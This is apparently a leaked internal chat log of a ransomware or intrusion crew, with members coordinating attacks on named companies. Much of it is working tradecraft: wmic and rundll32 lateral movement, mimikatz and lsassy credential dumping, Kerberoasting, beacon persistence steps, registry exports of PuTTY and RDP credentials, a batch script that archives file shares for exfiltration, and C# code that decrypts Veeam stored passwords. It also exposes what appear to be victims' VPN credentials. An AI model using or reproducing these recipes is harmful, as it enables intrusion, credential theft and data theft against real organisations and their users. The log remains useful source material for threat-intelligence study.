+4) In each trust session (or an indication of connections from where to where and how to enter)
+6) Allocation of a separate group of backup servers, allocation of user PCs to a separate group
+Repeat steps above for each domain
+
+Date: 2020-10-05T15:38:20.844Z
+From: user3
+shell copy npCIDetect.dll \\10.195.23.1\C$\ProgramData
+shell wmic /node:10.195.23.1 process call create "rundll32 C:\ProgramData\npCIDetect.dll entryPoint"
+
+Date: 2020-10-05T15:37:12.453Z
+From: tl1
+Message: how did you get there?
+
+Date: 2020-10-05T15:35:48.035Z
+From: user3
+Message: @tl1 I'm walking here legalco.local
+
+Date: 2020-10-05T18:27:39.328Z
+From: tl1
+Message: we are interested in file storage, backups, edr, virtualization systems
+
+Date: 2020-10-06T15:40:07.901Z
+From: user9
+Message: shell rundll32 C:\Users\color764\AppData\Local\Packages\AD2F1837.HPPrinterControl_v10z8vjag6ke6\LocalState\HPPrinterControl_v10.dll, entryPoint
+
+Date: 2020-10-06T21:08:08.487Z
+From: tl1
+Message: and then commands like this
+
+Date: 2020-10-06T21:08:05.856Z
+From: tl1
+Message: ```
+wdigest
+tspkg
+kerberos
+ssp
+livessp
+hashdump
+
+Date: 2020-10-06T21:07:57.860Z
+From: tl1
+Message: use mimikatz
+
+Date: 2020-10-07T23:50:25.210Z
+From: tl2
+Message: stop using powershell to the maximum where you can get by with dotnet
+
+Date: 2020-10-07T21:01:16.823Z
+From: tl1
+Message: search for keywords like network ,admin, tech etc
+
+Date: 2020-10-07T21:00:48.371Z
+From: tl1
+Message: you select them from ad_users and use this tool to find their PC where there will be valuable information about the network, just the same there should be information about the edr, backup, etc.
+
+Date: 2020-10-07T21:00:22.408Z
+From: tl1
+Message: namely in the task of "search for techies"
+
+Date: 2020-10-07T21:00:06.326Z
+From: tl1
+Message: actually helps to search for PCs assigned to users
+
+Date: 2020-10-07T18:19:00.637Z
+From: tl1
+Message: in this way you check if the current credits are rolling to the remote PC
+
+Date: 2020-10-07T18:18:41.599Z
+From: tl1
+Message: you make yourself an LA token for the intended car
+
+Date: 2020-10-07T18:17:01.638Z
+	From: tl2
+	Message: Friends, please.
+	we will often encounter VPNs. I remember them as a whole + - by heart by configs and other things, but in order to make it more convenient for everyone - please make a separate topic on the forum where VPN installers will be located, instructions for finding VPN config files on various operating systems and other things related to this type of access
+	
+	Date: 2020-10-07T18:13:50.872Z
+	From: tl2
+	Message: also
+	jump psexec64 10.225.10.200 https
+	pre- generates a dirty binary that can even trigger a normal winddef, such attempts are almost guaranteed to create a security event
+
+Date: 2020-10-07T00:37:43.605Z
+From: tl1
+Message: you can theorize here up to sorting out the name of the admin's dog as a password)
+
+Date: 2020-10-07T00:36:22.504Z
+From: tl1
+Message: iis sploits
+
+Date: 2020-10-07T00:36:27.584Z
+From: user9
+Message: the situation is theoretical)
+
+Date: 2020-10-07T00:36:11.290Z
+From: tl1
+Message: ftp sploits
+
+Date: 2020-10-07T00:36:11.616Z
+From: user9
+message: question
+have no la
+credits (anywhere at all)
+won't get up
+to scan the network, look for 7/xp/sql, etc. - and pierce them with sploits
+let 's say kerb is still being cashed
+Keyloggers , fakelogons....
+
+Date: 2020-10-07T00:28:38.450Z
+From: user9
+Message: vpinc.net
+User not LA
+credits from browsers
+BP info
+checked not AB\test domain
+Got LA\DA\EA lists
+sitifno
+run dll
+checking files on the machine containing passwords
+checking ad_computer\users for passwords
+attempts to raise rights (2020-076)
+mimikatz value::creds
+session flew off
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0767
+
+Date: 2020-10-07T00:15:23.213Z	
+	From: user7
+	Message: collected information from the machine adynf, silbelt, sharpweb, rubeus ker, invok kerb, tried no gppp (did not find anything)
+	ran through the folders
+	went over from hell computers machines to win 2003 and XP
+	pinged them and made a list
+	Alexey connected and on one of the wines 2003 raised the system
+	with YES credits filled in dll and launched
+	removed hashes from DC
+	began to supplement the list of servers, decided to make life easier with the lyokha script and fouled up the dock over which he sat all this time when he got hell info
+	Date: 2020-10-07T00:14:16.420Z
+	From: user8
+	Message: there were groups, the current user was not a member of them
+	
+Date: 2020-10-07T00:13:52.084Z
+	From: tl1
+	Message: Has anyone had a similar situation with LA as I described? that there is no direct indication of the current user, but there are other groups?
+	
+Date: 2020-10-07T00:16:48.610Z
+	From: user8
+	Message: ```
+	Session received :
+	UserName: forstern (not locale admin)
+	HostName: SHO-LT-4726W10
+	Domain: bnpmedia.com
+	Got :
+	AdFind
+	DCs
+	DA
+	EA
+	LA (SHO-LT-4726W10)
+	SeatBelt
+	WinPeas
+	Kerb hash (Rubeus)
+	1 password from browser (SharpWeb) from MSOutLook
+	Didn't work:
+	CVE-2020-0796 - session in system context did not spawn, no error
+	Net-GPPPasswords.exe - parsed, did not give credits
+	Invoke-Kerberoast.ps1 - gave an error that there are no users for kerberoast
+	smb_login - went through the password from MSOutLook on the current subnet, on no machine
+	approached
+	SharpChrome - did not issue credits
+	Didn't make it :
+	MS_17_010 - Collected OS: Windows XP, 7, Server 2003, 2008, not everyone managed to ping, planned to run ms_17_010_psexec on successfully pinged ones.
+	Also sorted the servers into groups.
+	OpenVPN and ScreenConnector configs were found on the computer.
+	OpenVPN could not be deployed on Dedicated Server.
+	
+Date: 2020-10-07T00:15:54.839Z
+	From: user4
+	Message: ```
+	*CHETU.COM*
+	removed AD info
+	removed net accounts /dom net group "domain admins" /dom net group "enterprise admins" /dom
+	removed invok-kerberos and gave it to brute
+	SeatBelt + winPEAS
+	CharpChrome - pulled out 10 passwords that match the length of the domain requirements.
+	raise privileges, despite not updated Windows for a long time
+	from ad_computers and adjusted the list to ping
+	On the FS I found the OneNote passwords.one backup file (On 8-27-2020).one I need to try to restore it on the dedicated server (I'm doing this now)
+	Prepared a list of interesting files on the FS (unattend and office docks)```
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0796
+
+Date: 2020-10-08T15:18:32.770Z
+From: brandon
+Message: Does anyone know if it's possible to extract useful information from the ntuser.dat file, and if so, how to do it?
+
+Date: 2020-10-09T22:33:21.056Z
+From: rosette
+Message: ```doskey /history
+```
+History in cmd. sometimes it can be useful
+
+Date: 2020-10-09T20:20:54.773Z
+From: alter
+Message: remote desktop manager
+RDCMan
+
+Date: 2020-10-09T20:20:18.757Z
+From: rosette
+Message: pliz remind me how to massively process servers through rdp so as not to score credits all the time? rdp manager or something like that software is called
+
+Date: 2020-10-10T02:30:33.422Z
+From: user4
+Message: `lsassy [--hashes [LM:]NT] --dumppath /share/path/to/dump.dmp [<domain>/]<user>[:<password>]@<target>`
+
+Date: 2020-10-10T02:30:07.479Z
+From: tl2
+message: what? what are you talking about?)
+
+Date: 2020-10-10T02:28:49.709Z
+From: user4
+Message: that is, run without specifying credits with the goal of a wheelbarrow where YES sits?
+
+Date: 2020-10-12T23:22:07.055Z
+From: tl2
+Message: well, I threw how to pull chrome through DPAPI
+https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++
+
+Date: 2020-10-12T21:20:13.834Z
+From: user9
+Message: ```
+How to use VPN
+1. Double-click the VPN icon on the Desktop
+Skip (2.double-click 38.68.2.51)
+3. Enter username JeffH (case sensitive)
+4. Enter password Sprouse20!
+5. click OK
+6. When finished, right-click 38.68.2.51 > click Disable
+7. Close the VPN window.
+
+Date: 2020-10-13T22:00:44.399Z
+From: tl2
+Message: calling piped commands in a batch file works better if you write credits
+minimizes bugs
+
+Date: 2020-10-13T21:59:44.403Z
+From: user8
+Message: so under the token is not
+
+Date: 2020-10-13T21:59:33.636Z
+From: tl2
+Message: plus I would add YES credits to vmik launch just in case
+
+Date: 2020-10-13T21:58:38.269Z
+From: tl2
+Message: change to cmd /c
+
+Date: 2020-10-13T21:58:33.054Z
+From: tl2
+Message: clear, understood, remove run
+
+Date: 2020-10-13T21:57:06.943Z	
+	From: tl2
+	Message: C:\starter.exe
+	Date: 2020-10-13T21:57:02.935Z
+	From: tl2
+	Message: and by the way, it's better to copy directly to the root
+Date: 2020-10-13T21:56:51.020Z
+	From: tl2
+	Message: psexec_command
+	wmicexec_command (I don't remember the exact name of the wmic module - but something like that)
+	both of them even accept hashes if there are no clears at hand
+
+Date: 2020-10-13T02:30:35.717Z	
+	From: tl2
+	Message: so, gentlemen, for questions
+	1. smb_login with credits on the DC / net use on the DC / login to Outlook or webmail (if domain authorization is attached) / ldap_login (https://github.com/lanjelot/patator) for example by a patator
+	2. The first part is a rudimentary LM hash, you can safely forget about what it is with us, it was and will always be the same, the second is NTLM hash, in fact, the one that we often use for authorization
+	3. It will be later, you can set tasks through the admin panel on decrypt hashes and brute force of keypasses / docks / excels
+	4. https://github.com/0xthirteen/StayKit - all pinning techniques are described here and divided into categories and by privilege level, there is nothing more detailed here, there have been no "unique" techniques for Windows systems for years. There are alternative things like web shells on a web server (this is aspx code that is hosted on a web server, in this case IIS where a functional application "lives" - most often and most conveniently uploaded to an exchange), there is an IIS module. For now, stop at stay-kit'e because it gives understanding, in the future I will simply give you a convenient tool for fixing simply by running the dll
+	5. everything that is in the network is administered by people. the key to obtaining the most detailed data about the investigated IS lies with the admins/network engineers. These are digrams and accesses and everything else. You can identify cloud or taped backups only through them or by indirect signs (services / tasks on critical servers, entries in hell, etc.)
+	6. the question is incorrect. you don't "need" to do it, smb_pipe is basically just a type of load that is +- technically equal to bind payload in metasploit, used for machines with authorization restrictions or for machines that are not able to pipe out with standard http(s)/dns/tcp protocol, that is, jump psexec (_psh) 10.0.0.1 pipe is the creation of a service for the bind pipe, through which the initiating machine will then connect
+	7. I will issue a builder dll files
+	8. You now have like three, do you need more? if yes - tell me which servers and how many do you need
+	9. And what hangs? I do not know.
+
+Date: 2020-10-14T12:21:57.341Z
+From: alter
+Message: fat32
+
+Date: 2020-10-13T21:42:55.625Z
+From: alter
+Message: 039482753QQ
+
+Date: 2020-10-13T18:07:18.861Z
+From: fly
+Message: already walked
+
+Date: 2020-10-13T18:07:11.096Z
+From: fly
+Message: I go to the administrator, he sleeps at night
+
+Date: 2020-10-13T16:37:46.032Z
+From: fly
+Message: ```beacon> AV_Query
+[+] Determining what AntiVirus is installed...
+[+] host called home, sent: 267422 bytes
+[+] received output:
+
+PID|Name|Path
+
+Windows Defender AV Signature Version:
+1.259.1455.0
+
+AV Name|Version|Install Date
+
+[+] received output:
+
+displayName : Trend Micro Apex One Antivirus
+pathToSignedReportingExe : C:\Program Files (x86)\Trend Micro\Security Agent\TmListen.exe
+timestamp : Tue, 15 Sep 2020 15:31:55 GMT
+
+displayName : Windows Defender
+pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe
+timestamp : Mon, 15 Jan 2018 22:15:39 GMT
+
+Date: 2020-10-13T16:34:49.469Z
+From: rosette
+Message: ```
+@echo off
+REG EXPORT "HKEY_CURRENT_USER\Software\SimonTatham" "C:\ProgramData\AppBkUp1.reg"
+REG EXPORT "HKEY_CURRENT_USER\Software\Martin Prikryl" "C:\ProgramData\AppBkUp2.reg"
+REG EXPORT "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client" "C:\ProgramData\AppBkUp3.reg"
+```
+
+Date: 2020-10-13T16:34:45.065Z
+From: fly
+Message: ```putty HKCU\Software\SimonTatham\PuTTY\Sessions
+    	recursive search *.ppk up to 3rd level in:
+%USERPROFILE%\Documents
+%USERPROFILE%\.ssh
+%USERPROFILE%\Downloads
+HKCU\Software\SimonTatham\PuTTY\Sessions
+```
+
+Date: 2020-10-13T16:34:35.081Z
+From: rosette
+Message: hh sec
+
+Date: 2020-10-13T16:34:33.240Z
+From: rosette
+Message: I guess the credits are stored in the registry
+
+Date: 2020-10-13T16:34:27.445Z
+From: rosette
+Message: patty is
+
+Date: 2020-10-13T16:34:24.154Z
+From: rosette
+Message: specify which avi
+
+Date: 2020-10-13T16:34:22.263Z
+From: rosette
+Message: edr_query
+
+Date: 2020-10-13T16:34:05.729Z
+From: fly
+Message: Putti is open for admin and he is authorized there
+
+Date: 2020-10-13T16:32:51.425Z
+From: fly
+Message: there is a computer of the administrator - there putti. I searched everything - there are no credits. The session does not arrive at the MSF - it cuts AB (they wanted to work with putti through the MSF)
+Question - do we have any solution for getting credit from putti? Stiller or something else?
+
+	
+Date: 2020-10-14T12:41:33.072Z
+From: rosette
+Message: mssql != muscle
+you need to try to look for his computer and credits somewhere he may have
+either in balls \ DEV zones
+
+Date: 2020-10-14T12:40:03.406Z
+From: rosette
+Message: and everything will be on the desktop / password manager
+
+Date: 2020-10-14T12:39:53.121Z
+From: rosette
+Message: + to hunt the machine of SKL developer \ system administrator is not a problem, is it?
+
+Date: 2020-10-14T12:39:35.590Z
+From: rosette
+Message: it makes sense to look in the application configs
+
+Date: 2020-10-14T12:39:10.503Z
+From: rosette
+Message: for starters, it's probably worth looking to see if there is a database \ hostname to which you want to cling to ad_computers. if not then ... alas
+
+Date: 2020-10-14T12:38:37.935Z
+From: rosette
+Message: linux credits != database credits
+
+Date: 2020-10-14T12:38:05.905Z
+From: rosette
+Message: and muscle cmd under the current context did not meet
+
+Date: 2020-10-14T12:37:43.601Z
+From: rosette
+Message: then you can account for YES by the module in the mysql_sql msf
+
+Date: 2020-10-14T12:37:32.564Z
+From: rosette
+Message: if you already have permissions raised
+
+Date: 2020-10-15T20:53:10.786Z
+From: user8
+Message: Colleagues! I'm writing a note in the general channel!
+In the mstsc.exe process, the shell did not work for me with the following error:
+
+Date: 2020-10-20T12:19:49.585Z	
+	From: user8
+	Message: ```
+	Using GPO for Deployment
+	To install SecureAnywhere using GPO, you should have experience with Microsoft's Active Directory and the GPO editor.
+	You can also watch a video on how to use GPO at How to Deploy Using Group Policy - SecureAnywhere Business.
+	To install SecureAnywhere using GPO:
+	From the following location, download the SecureAnywhere MSI installer to a network share:
+	http://anywhere.webrootcloudav.com/zerol/wsasme.msi
+	Downloading the file makes it accessible to all endpoints on which you will deploy SecureAnywhere.
+	Go to the server that is the domain controller for the deployment group.
+	Open the GPO editor on the domain controller and create a policy for the deployment group.
+	Assign SecureAnywhere to all endpoints that belong to the Organizational Unit where the Group Policy is created.
+	SecureAnywhere installs on the endpoints in the group when they restart.
+
+Message: coba keylogger*
+
+Date: 2020-10-20T02:03:21.034Z
+From: user8
+Message: in the working days is it a keylogger, it turns out?
+they don't save creds from av in chrome anywhere
+keylogger installed today on a bunch of cars, as a result in keystrox - tumbleweed
+
+Date: 2020-10-21T02:13:40.454Z
+	From: user3
+	Message: ```
+	beacon> shell reg query HKCU\Environment
+	[*] Tasked beacon to run: reg query HKCU\Environment
+	[+] host called home, sent: 57 bytes
+	[+] received output:
+	HKEY_CURRENT_USER\Environment
+	Path REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
+	TEMP REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Temp
+	TMP REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Temp
+	OneDrive REG_EXPAND_SZ C:\Windows\system32\config\systemprofile\OneDrive
+	UserInitMprLogonScript REG_SZ rundll32.exe C:\Windows\Temp\STA-NURSEAL-20201020-2033.dll,entryPoint
+Date: 2020-10-21T02:03:26.495Z
+	From: user3
+	Message: ```
+	-Load the resulting DLL into a writable directory
+	- RMB on session, persistence - non-elevated - userinitmprlogonscriptkey
+	-Enter Command : rundll32.exe C:\temp\keep64.dll,entryPoint (MUST specify the full path to the dll file, MUST rename the dll file before loading into something more "organic" depending on the files surrounding it)
+	-Launch
+	-Check if the entry in the registry was created by the beacon command shell reg query HKCU\Environment
+	
+Date: 2020-10-22T14:27:48.758Z
+From: samuel
+Message: Is there a YES credit? try with msf psexec_com
+set command cmd /c ping google.com
+
+Date: 2020-10-22T14:25:22.549Z
+From: Andy
+Message: hmm, maybe the problem is in the PC itself from which I launch the vmik or task, on it it says access is denied when executing...
+
+Date: 2020-10-22T14:24:30.077Z
+From: Andy
+Message: how to ping another server on google com or netstat?) Previously, I did it through a task or vmik, threw a batch file with commands and output in txt on the desired server, but now it doesn’t work, is there another option?)
+
+Date: 2020-10-22T14:20:50.219Z
+From: samuel
+Message: this is your server, where you want to go. remove pingany google com or netstat
+
+Date: 2020-10-22T14:20:39.034Z
+From: white
+Message: sorry, I read it wrong
+
+Date: 2020-10-22T14:19:33.576Z
+From: Andy
+Message: executing wmic and the task does not work, I'm trying to remotely launch it on another PC to run the build there
+
+Date: 2020-10-22T14:18:01.578Z
+From: Andy
+Message: indicating the credit also no access
+
+Date: 2020-10-22T14:15:16.090Z
+From: samuel
+Message: is the server looking outside?
+
+Date: 2020-10-22T14:14:55.457Z
+From: samuel
+Message: Can't quit session?
+
+Date: 2020-10-22T18:49:41.048Z	
+	From: tl2
+	Message: projection of the logics prescribed in the OS and groups on the results of scanning from different points
+Date: 2020-10-22T18:49:13.613Z
+	From: tl2
+	Message: try to understand the logic of the location of the "pieces of iron" that block ports
+	it can be by physical location, functional assignment, departmental assignment, just pieces of iron between the server and user segments
+	often in such networks there are many DCs and subnets are isolated from each other, but there are no domain controllers for successful replication
+Date: 2020-10-22T18:44:25.971Z
+	From: tl2
+	Message: and almost never put on a "technician's car"
+Date: 2020-10-22T18:44:21.622Z
+	From: tl2
+	Message: fireworks are placed on segments
+
+Date: 2020-10-22T18:41:59.935Z	
+	From: tl2
+	Message: but this is unlikely to work because ntlm riley in its current state can only "hit" on another machine besides the one from which the connection is initiated
+Date: 2020-10-22T18:41:31.416Z
+	From: tl2
+	Message: some sort of spoof to not only captivate, but to relay authorization from this machine
+
+Date: 2020-10-28T16:22:13.802Z	
+	From: tl1
+	Message: expects a file in a sys32 directory and forbids deleting it
+Date: 2020-10-28T16:22:01.373Z
+	From: tl1
+	Message: ```
+	The “poc.exe” simply waits until the file is created in our target directory and then places an oplock in order to prevent the deletion (which will fail because of sharing violations)
+	
+Date: 2020-10-29T20:28:49.710Z
+From: fly
+Message: %login%123
+
+Date: 2020-10-29T20:28:37.171Z
+From: rosette
+Message: mutation then ? it’s possible somehow, but I didn’t understand, usually a bruter does this
+
+Date: 2020-10-29T20:28:01.578Z
+From: alex
+Message: they are humanoid and similar to the existing ones
+
+Date: 2020-10-29T20:27:47.144Z
+From: alex
+Message: we have a pool of similar passwords
+
+Date: 2020-10-29T20:27:38.694Z
+From: alex
+Message: I mean if you set the prog to a character pool and similar passwords and it will sort it out according to the pattern
+
+Date: 2020-10-29T20:27:17.552Z
+From: rosette
+Message: + passes that are in chrome from the admin whose passes you stole
+
+Date: 2020-10-29T20:26:57.070Z
+From: rosette
+Message: it usually helps to decrypt and sort through 1-2 thousand passes from ntds
+
+Date: 2020-10-29T20:26:55.336Z
+From: steven
+Message: alex hashes there for 4 days on brute
+
+Date: 2020-10-29T20:26:41.069Z
+From: rosette
+Message: and hashcat
+
+Date: 2020-10-29T20:26:39.204Z
+From: rosette
+Message: of course. hash will be exported from there
+
+Date: 2020-10-29T20:26:29.130Z
+From: alex
+Message: kdbx
+
+Date: 2020-10-29T20:26:25.080Z
+From: alex
+Message: who knows any jdbx password breakers
+
+Date: 2020-11-03T17:38:45.039Z
+From: t3chnolog
+Message: ntlm on cmd5.org
+
+Date: 2020-11-03T17:32:49.662Z
+From: Bug
+Message: where are you brute hashes?
+
+Date: 2020-11-03T17:09:04.809Z
+From: Bug
+Message: user does not have admin rights
+
+Date: 2020-11-03T16:54:55.168Z
+From: t3chnolog
+Message: again, depending on whether LAPS is worth it or not
+
+Date: 2020-11-03T16:54:43.601Z
+From: t3chnolog
+Message: or remove admin locale and try it
+
+Date: 2020-11-03T16:54:39.435Z
+From: t3chnolog
+Message: if you have access rights to the login user, you can try his account on neighboring hosts
+
+Date: 2020-11-03T16:31:38.152Z
+From: Bug
+Message: moreover, there are legal systems on the user's computer, win10 pro
+
+Date: 2020-11-03T16:30:08.234Z
+From: Bug
+Message: ms17 past, tried
+
+Date: 2020-11-03T16:29:57.025Z
+From: Bug
+Message: C:\Temp>net accounts
+Force user logoff how long after time expires?: Never
+Minimum password age (days): 0
+Maximum password age (days): 42
+Minimum password length: 0
+Length of password history maintained: None
+Lockout threshold: Never
+Lockout duration (minutes): 30
+Lockout observation window (minutes): 30
+Computer role: SERVER
+The command completed successfully.
+
+c:\temp>
+
+Date: 2020-11-03T16:27:44.737Z
+From: t3chnolog
+Message: if your goal is not to smoke materiel, but to advance as quickly as possible, then fucking through ms17 try and that's it)
+
+Date: 2020-11-03T16:26:31.292Z
+From: t3chnolog
+Message: firstly, it's not a fact that you will brute this sqluser (see the password policy in the corp, if it's hard then forget it)
+secondly, it’s not a fact that you will get out from under MSSQL further (can you do xp_cmdshell?)
+
+Date: 2020-11-03T16:25:42.342Z
+From: t3chnolog
+Message: I'll tell you specifically about your situation
+
+Date: 2020-11-03T16:24:43.925Z
+From: t3chnolog
+Message: krch the point is that until you understand what kind of fucker it is, what kind of hashes and tickets it is, there is no point in experimenting
+
+Date: 2020-11-03T16:24:43.100Z
+From: Bug
+Message: but it doesn’t let it go anywhere because the user has no rights)
+
+Date: 2020-11-03T16:24:28.089Z
+From: Bug
+Message: well, I experimented
+
+Date: 2020-11-03T16:24:10.157Z
+From: Bug
+Message: [ ](http://wfy76wigkpoxqbe6.onion/group/discussion?msg=4GWTca9k9tLBhidBj) in short, the most effective way to brute this hash, tell me the service?
+
+Date: 2020-11-03T16:24:08.569Z
+From: t3chnolog
+Message: well you can experiment
+
+Date: 2020-11-03T16:22:31.258Z
+From: Bug
+Message: here they do PTT like
+
+Date: 2020-11-03T16:22:22.430Z
+From: Bug
+Message: https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+
+Date: 2020-11-03T16:22:00.006Z
+From: t3chnolog
+Message: what options do you want besides brute?
+
+Date: 2020-11-03T16:21:41.007Z
+From: t3chnolog
+Message: pc4 you have there, as I understand it
+
+Date: 2020-11-03T16:21:35.967Z
+From: Bug
+Message: no options other than brute?
+
+Date: 2020-11-03T16:21:13.556Z
+From: t3chnolog
+Message: and you can reset the sqluser account
+
+Date: 2020-11-03T16:21:01.006Z
+From: t3chnolog
+Message: here is your ticket for getting access to MSSQL
+
+Date: 2020-11-03T16:20:50.383Z
+From: t3chnolog
+Message: ```
+Client: web@site.site.NO
+Server: MSSQLSvc/sitefil2.site.site.no:1433@site.site.NO
+KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_deleg
+ate name_canonicalize
+Start Time: 11/3/2020 15:43:35 (local)
+End Time: 11/4/2020 0:41:26 (local)
+Renew Time: 11/10/2020 14:41:26 (local)
+Session Key Type: AES-256-CTS-HMAC-SHA1-96
+Cache Flags: 0
+Kdc Called:
+
+Date: 2020-11-03T16:18:16.446Z
+From: t3chnolog
+Message: 1) you are requesting tickets
+2) swap from memory to disk
+3) bragging
+4) PROFIT
+
+Date: 2020-11-17T21:12:03.633Z
+From: brad
+Message: Has anyone tried https://mega.nz/cmd?
+in fact, commands can be given through a koba
+
+Date: 2020-11-17T21:02:29.206Z
+From: t3chnolog
+Message: forget about sftp, pack it into an archive with a password and upload somewhere to a fileshare
+I don't know the best way
+
+Date: 2020-11-18T16:52:03.444Z
+From: cybercat
+Message: Yo guys, I want to share with you a useful batch file, it runs through the ball and adds files matching the date condition to the archive + creates a file with a listing of the archived files and adds it to the archive, specify your information for work:
+share - the path to the share
+z7a - path to console 7zip executable
+archive - path and name of the future archive
+mindate - minimum file date for archiving
+diskword - letter to mount fs shares (should be free)
+compres - compression level
+*For the batch file to work in the C:\ProgramData folder, there must be a Temp folder (C:\ProgramData\Temp)
+**Paths to the archiver and to the created archive must be without spaces
+*** leave all the quotes in their places))
+
+save as share.bat upload to server and run via shell share.bat
+
+Minimal automation for those who drag data =)
+```
+set share="\\COMPUTER.domain.com\ShareName"
+set z7a=C:\ProgramData\Temp\7za.exe
+set archive=C:\ProgramData\Temp\NameOfNewArchive.7za
+set mindate=+01/01/2020
+set diskword=L:
+set compres=-mx9
+net use %diskword% %share%
+forfiles /P %diskword%\ /S /C "cmd /c if @isdir==FALSE (\"%z7a%\" a %compres% \"%archive%\" @path)" /D %mindate%
+forfiles /P %diskword%\ /S /C "cmd /c if @isdir==FALSE (echo @path >> C:\ProgramData\Temp\full_listing.txt)" /D %mindate%
+"%z7a%" a %compres% "%archive%" C:\ProgramData\Temp\full_listing.txt
+del C:\ProgramData\Temp\full_listing.txt
+net use * /delete /y
+
+Date: 2020-11-30T19:01:36.089Z
+From: t3chnolog
+Message: I looked, there really are credits of the form root ****** esxi opens via http
+
+Date: 2020-11-30T18:53:52.868Z
+From: t3chnolog
+Message: >does your viim connect to this stack to save it or to put a backup there?
+both, there are virtuals, he makes replications of these virtuals and puts them there, next to the virtual hards
+
+Date: 2020-11-30T18:48:34.573Z
+From: Bug
+Message: what is the script that looks at the DC when and in what PC was the user logged in?
+
+Date: 2020-11-30T17:23:41.292Z
+From: t3chnolog
+Message: I have another question, what to do with these replications
+I remember it was the case, they just packed it into an archive with a password, but you can even throw a dick there, I don’t remember how we archived everything there then
+
+Date: 2020-11-30T17:22:56.214Z
+From: t3chnolog
+Message: castrated linux, everything is correct
+
+Date: 2020-11-30T17:22:45.303Z
+From: t3chnolog
+Message: there is a piece of iron like dell poweredge and a raid disk array is connected to it
+
+Date: 2020-11-30T17:22:04.659Z
+From: t3chnolog
+Message: to the server itself
+
+Date: 2020-11-30T17:21:53.848Z
+From: t3chnolog
+Message: did you get into esxi via ssx?
+
+Date: 2020-11-30T17:19:53.489Z
+From: t3chnolog
+Message: all of a sudden you don't have to fuck your brains
+
+Date: 2020-11-30T17:19:41.272Z
+From: t3chnolog
+Message: by the way, you made me think that it makes sense to check domain authorization on esxi
+
+Date: 2020-11-30T17:19:23.578Z
+From: t3chnolog
+Message: I did not climb into the hypervisor
+
+Date: 2020-11-30T17:19:09.734Z
+From: t3chnolog
+Message: most likely yes, but I'm more concerned about storage
+
+Date: 2020-11-30T17:17:57.241Z
+From: t3chnolog
+Message: but it seems like there is just a root account in vim
+
+Date: 2020-11-30T17:17:45.881Z
+From: t3chnolog
+Message: although about the root, I'll still check in guys, mb I fucked up
+
+Date: 2020-11-30T17:17:28.720Z
+From: t3chnolog
+Message: virtual hards are in the same place
+
+Date: 2020-11-30T17:17:03.474Z
+From: t3chnolog
+Message: there replications fly to esxi storage
+in the creds for connecting to it, root ******** is indicated
+
+Date: 2020-11-30T17:15:14.313Z
+From: t3chnolog
+Message: I need them
+
+Date: 2020-11-30T17:15:01.233Z
+From: t3chnolog
+Message: you want to say there and root passes to hypervisors should be?
+
+Date: 2020-11-30T17:11:45.250Z
+From: t3chnolog
+Message: mb who has already climbed the database and knows where there is
+
+Date: 2020-11-30T17:11:04.486Z
+From: t3chnolog
+Message: ```
+SELECT TOP (1000) [id],[user_name],[password],[usn],[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials];
+```
+there, this line needs to be changed, because the credits for storages are clearly not there
+
+Date: 2020-11-30T17:10:06.692Z
+From: t3chnolog
+Message: ```
+tasklist /v
+netstat -ano
+Looking for MsSQL port by PID in 2 outputs
+looking for where is sqlcmd.exe
+"c:\Program Files\Microsoft SQL Server\110\Tools\Binn\sqlcmd.exe" -S localhost,port_found -E -y0 -Q "SELECT TOP (1000) [id],[user_name],[password], [usn],[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials];"
+
+option -y0 required otherwise sqlcmd cuts output
+
+then take this code
+
+using System;
+using System.Collections.Generic;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace Main
+{
+internal static class Program
+	{
+	private static void Decrypt(string b,string a){
+		if (string.IsNullOrEmpty(a))
+		{
+			return;
+		}
+		byte[] encryptedData = Convert.FromBase64String(a);
+		Console.WriteLine(b+':'+Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.LocalMachine)));		
+		return;
+	}
+	private static void Main(string[] args)
+		{
+			Decrypt("optional username","hash from sqlcmd output here");
+		}
+}
+}
+
+for each hash, a separate call to the Decrypt function
+
+build c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe veeam.cs
+
+upload the resulting exe to the server with veeam and run
+```
+
+Date: 2020-11-30T17:06:19.029Z
+From: t3chnolog
+Message: I have a mini-manual here, but I'm not sure if it will work on storage
+
+Date: 2020-11-30T17:05:47.343Z
+From: t3chnolog
+Message: specifically to storages, not credits to the vim panel itself
+
+Date: 2020-11-30T17:05:25.449Z
+From: t3chnolog
+Message: who managed to rip out hypervisor/storage credits from vim?
+
+
+Date: 2020-12-02T20:45:09.455Z
+From: alter
+Message: https://www.vishalon.net/blog/commands-for-using-standalone-7-zip-to-split-and-combine-zip-file
+
+Date: 2020-12-02T20:42:28.015Z
+From: red
+Message: how to do it through some kind of gui is understandable, but how to do it and is it possible using 7za console
+
+Date: 2020-12-02T20:41:49.565Z
+From: red
+Message: also interested, or if you know how it is possible to archive a folder, let's say that when archiving, the archive is beaten into parts of 1GB, for example?
+
+Date: 2020-12-02T20:38:15.996Z
+From: green
+Message: bro, there are a lot of files in the folder. And all at once. If you fool around with names, you can get confused. it would be more convenient to just set the number, say the first 20, then the next, and so on and so on until the end
+
+Date: 2020-12-02T20:35:47.277Z
+From: green
+Message: will this work with 7z.exe? just yes, an example of how to archive the first 20 files from a folder
+
+Date: 2020-12-02T20:34:45.760Z
+From: green
+Message: bro, I know how to archive stupidly all folders. I'm interested in the moment of flags and so on. how to spell it correctly
+
+Date: 2020-12-02T20:32:12.785Z
+From: green
+Message: Salute to all. Can someone tell me how to accurately archive files from a folder in a beacon, but not all, but selectively. Let's say the first 20 , then the next, and so on, or say based on the weight or the letter that the files in the folder begin with.
+
+
+Date: 2020-12-07T19:17:58.619Z	
+	From: user9
+	Message: via msf
+Date: 2020-12-07T19:17:50.754Z
